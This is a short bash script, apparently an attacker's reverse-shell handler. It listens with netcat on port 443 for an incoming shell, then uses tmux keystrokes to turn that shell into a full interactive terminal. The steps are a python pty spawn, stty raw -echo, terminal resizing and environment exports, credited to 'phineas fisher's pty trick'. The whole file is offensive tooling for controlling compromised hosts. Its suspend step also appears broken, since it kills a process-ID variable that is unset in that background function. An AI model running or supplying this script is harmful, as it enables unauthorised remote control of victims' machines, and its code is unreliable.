#! /bin/bash

if [ -z "$TMUX" ]; then
    echo "[X] $0 must be run inside a tmux instance."
    exit 1
fi


LPORT=443
nc="nc"
ncflags="-lnvp"
ncpid_file=$(mktemp)

function cleanup_fisher () {
    reset
    echo "[+] Have a nice day!"
    exit 0
}

trap cleanup_fisher INT

function lookup_ncpid () {
    cat $ncpid_file
}

function wait_for_nc_connection () {
    p=$1
    phrase="ESTABLISHED ${p}/${nc}"
    echo "[+] Waiting to see $phrase in netcat -anp output"
    while :; do
        netstat -anp | grep "$phrase" && break
        echo -n "."
        sleep 0.33
    done
}

function phineas () {
    # first, get the dimensions of the terminal
    remote_shell="/bin/bash"
    rows=$(tput lines)
    cols=$(tput cols)
    termdims="stty rows $rows columns $cols"
    echo "[+] Measured terminal at $rows rows and $cols columns"
    sleep 1
    wait_for_nc_connection $(lookup_ncpid)
    tmux send-keys "python -c \"import pty; pty.spawn('" $remote_shell "')\"" Enter
    sleep 0.1
    kill -TSTP $ncpid # ncpid should hold the pid of your listening netcat instance
    tmux send-keys "stty raw -echo" Enter
    tmux send-keys "fg" Enter
    tmux send-keys "reset" Enter
    tmux send-keys "${termdims}" Enter
    tmux send-keys "export SHELL=/bin/bash" Enter
    tmux send-keys "export HOME=/dev/shm" Enter
    tmux send-keys "export TERM=screen" Enter
}

function pty_fisher () {
    echo "[+] waiting for a shell..."
    echo "[+] and invoking phineas fisher's pty trick"
    phineas &
    ${RLWRAP} ${nc} ${ncflags} $LPORT &
    ncpid=$!
    echo $ncpid > $ncpid_file
    kill -CONT $ncpid
    wait $ncpid
}

pty_fisher
cleanup_fisher
